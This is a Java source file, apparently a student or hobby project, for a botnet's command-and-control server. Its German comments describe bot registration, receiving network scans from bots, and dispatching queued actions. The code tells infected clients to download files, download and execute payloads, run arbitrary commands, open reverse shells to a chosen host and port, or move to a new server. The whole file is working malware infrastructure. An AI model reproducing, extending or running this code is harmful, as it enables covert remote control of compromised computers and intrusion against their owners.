package Botnet;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.security.NoSuchAlgorithmException;
import java.security.spec.InvalidKeySpecException;
import java.util.ArrayList;
import javax.xml.parsers.ParserConfigurationException;
import javax.xml.transform.TransformerException;
import javax.xml.xpath.XPathExpressionException;

import org.xml.sax.SAXException;



/**
 * Diese Klasse stellt den Server des Botnetzes dar. Und gibt Befehle an die jeweiligen Bots.
 * @author Cedric Busacker
 *
 */
public class Server {
	private static ArrayList<String[]> ACTIONS;
	ServerSocket serverSocket;
	/**
	 * Ruft handleConnection() auf.
	 * @param argv
	 * @throws Exception
	 */
    public static void main(String[] argv) throws Exception { 
    	handleConection();
      } // ende: main 
    	
    /**
     * Diese Methode wertet den angeforderten Modus aus.
     * @throws Exception
     */
    private static void handleConection() throws Exception {
    	ServerSocket serverSocket = new ServerSocket(80);
    	try{
    		while (true) {
    		System.out.println("Server is now listening on port: " + serverSocket.getLocalPort());
    		Socket socket = serverSocket.accept();
        	System.out.println("Server accepted a connection...");
        	DataOutputStream out_stream = new DataOutputStream(socket.getOutputStream());
            DataInputStream in_stream = new DataInputStream(socket.getInputStream());
        	int mode = in_stream.read();
        	System.out.println("Client requested mode: " + mode);
            switch (mode) {
			case 23:
				first_connect(in_stream, out_stream);
				break;
			case 45:
				ClientUpdate(in_stream, out_stream);
				break;
			case 31:
				NetworkScan(in_stream, out_stream);
			default:
				break;
			}
        	out_stream.write(-1);
        	socket.close();
        	System.out.println("Closed the connection... \n");
        	
		}
    	}
    	catch (Exception e) {
			serverSocket.close();
			e.printStackTrace();
		}


	}
    /**
     * Modus 31: Emptfängt einen angeforderten Netzwerk Scan von einem Bot
     * @param in_stream
     * @param out_stream
     * @throws IOException
     */
    private static void NetworkScan(DataInputStream in_stream, DataOutputStream out_stream) throws IOException {
    	System.out.println(in_stream.readUTF()); // Public Key of Client / Used for Identification
    	int length = in_stream.readInt();
    	System.out.println(length);
    	for (int i = 0; i < length; i++) {
			System.out.println(in_stream.readUTF());
			
		}
	}

    /**
     * Prüft ob eine Aktion für den anfragenden Bot existiert.
     * @param in_stream
     * @param out_stream
     * @throws IOException
     * @throws NoSuchAlgorithmException
     * @throws InvalidKeySpecException
     * @throws XPathExpressionException
     * @throws ParserConfigurationException
     * @throws SAXException
     * @throws TransformerException
     */
	private static void ClientUpdate(DataInputStream in_stream, DataOutputStream out_stream) throws IOException, NoSuchAlgorithmException, InvalidKeySpecException, XPathExpressionException, ParserConfigurationException, SAXException, TransformerException {
    	readActions();
    	
    	String pubKey = in_stream.readUTF();
		
    	System.out.println(pubKey); // Public Key of Client / Used for Identification
    	
    	int entry = -1;
		for (int i = 0; i < ACTIONS.size(); i++) {
			String temp = ACTIONS.get(i)[0];
			if (temp.contains(pubKey)||temp.equals("*")) {
				entry = i;
				break;
			}
		}
		if (entry!=-1) {
			handleAction(in_stream, out_stream, entry);
		}else {
			System.out.println("No suitable entry found");
			out_stream.writeInt(20);
		}
		
		
	}
/**
 * Wenn eine passende Aktion gefunden wird, werden eventuell benötigte Parameter aus der Aktionsliste gelesen und an den Bot übermittelt.
 * @param in_stream
 * @param out_stream
 * @param entry
 * @throws IOException
 * @throws NoSuchAlgorithmException
 * @throws InvalidKeySpecException
 * @throws XPathExpressionException
 * @throws ParserConfigurationException
 * @throws SAXException
 * @throws TransformerException
 */
	private static void handleAction(DataInputStream in_stream, DataOutputStream out_stream, int entry) throws IOException, NoSuchAlgorithmException, InvalidKeySpecException, XPathExpressionException, ParserConfigurationException, SAXException, TransformerException {
		
		
		
		int mode = Integer.parseInt(ACTIONS.get(entry)[1]);
		out_stream.write(mode);
		System.out.println("Answering with: "+mode);
		switch (mode) {
		case 40: //Download file to Path
			out_stream.writeUTF(ACTIONS.get(entry)[2]); //Website
			out_stream.writeUTF(ACTIONS.get(entry)[3]); //Path
			break;
		case 41: // Download file and execute
			out_stream.writeUTF(ACTIONS.get(entry)[2]); //Website
			out_stream.writeUTF(ACTIONS.get(entry)[3]); //Filename
			break;
		case 42: // Execute command
			out_stream.writeUTF(ACTIONS.get(entry)[2]); //CMD
			break;
		case 43: // ReverseShell
			out_stream.writeUTF(ACTIONS.get(entry)[2]); 						//Server (can be set to "normal")
			out_stream.writeInt(Integer.parseInt(ACTIONS.get(entry)[3])); 	//Port
			break;
		case 30: // get Client Update 
			logBot(in_stream, out_stream);
			break;
		case 31: // Receive Network Scan
			NetworkScan(in_stream, out_stream);
			break;
		case 32: // Client and Network Scan
			logBot(in_stream, out_stream);
			NetworkScan(in_stream, out_stream);
		case 33: // Receive Errors
			int length = in_stream.readInt();
			FileWriter LogWriter = new FileWriter("C:/Users/Public/errorService.log", true);
	    	for (int i = 0; i < length; i++) {
	    		LogWriter.write(in_stream.readUTF());
			}
			break;
		case 34:
			out_stream.writeUTF(ACTIONS.get(entry)[2]); // New Server
			break;
		case -1:
			break;
		default:
			System.err.println("Code is Unknown!");
			break;
		}
		if (entry!=-1&&ACTIONS.get(entry)[0]!="*") {
			writeActions(entry);
		}
		
	}

	/**
	 * Nachdem eine Aktion abgearbeitet wurde wird diese aus der Aktionsdatei entfernt.
	 * @param entry
	 * @throws IOException
	 */
	private static void writeActions(int entry) throws IOException {
		BufferedWriter writer = new BufferedWriter(new FileWriter(new File("actions.txt")));
		ACTIONS.remove(entry);
		for (int i = 0; i < ACTIONS.size(); i++) {
			String tempString = "";
			for (int j = 0; j < ACTIONS.get(i).length; j++) {
				tempString = ACTIONS.get(i)[j]+",";
			}
			tempString = tempString.substring(0, tempString.length()-1);
			writer.write(tempString);
		}
		writer.close();
		
	}

/**
 * Liest alle Aktionen aus der Aktionsdatei
 * @throws IOException
 */
	private static void readActions() throws IOException {
		
		
		if (!(new File("actions.txt").exists())) {new File("actions.txt").createNewFile();}

		ACTIONS = new ArrayList<String[]>();
		
		BufferedReader reader = new BufferedReader(new FileReader(new File("actions.txt")));
		String currentLine;
		while((currentLine = reader.readLine()) != null) {
		    String[] entries = currentLine.split(",");
		    ACTIONS.add(entries);
		}
		reader.close();
	}

	/**
	 * Ruft logBot() falls der modus FirstConnect() vom Bot angefordert wird.
	 * @param in_stream
	 * @param out_stream
	 * @throws Exception
	 */
	private static void first_connect(DataInputStream in_stream, DataOutputStream out_stream) throws Exception {
		out_stream.write(23);
		logBot(in_stream, out_stream);
    }

	/**
	 * Empfängt den öffentlichen Schlüssel des Bots sowie die Host Informationen des Bots.
	 * @param in_stream
	 * @param out_stream
	 * @throws NoSuchAlgorithmException
	 * @throws InvalidKeySpecException
	 * @throws IOException
	 * @throws XPathExpressionException
	 * @throws ParserConfigurationException
	 * @throws SAXException
	 * @throws TransformerException
	 */
	private static void logBot(DataInputStream in_stream, DataOutputStream out_stream) throws NoSuchAlgorithmException, InvalidKeySpecException, IOException, XPathExpressionException, ParserConfigurationException, SAXException, TransformerException {
		Host bot = new Host(false);
        bot.setIDENTIFIER(in_stream.readUTF());
		String msg = in_stream.readUTF();
        bot.fromString(msg);
        new AddXmlNode(bot.toString());
        System.out.println("Logged Bot...");
		
	}
    }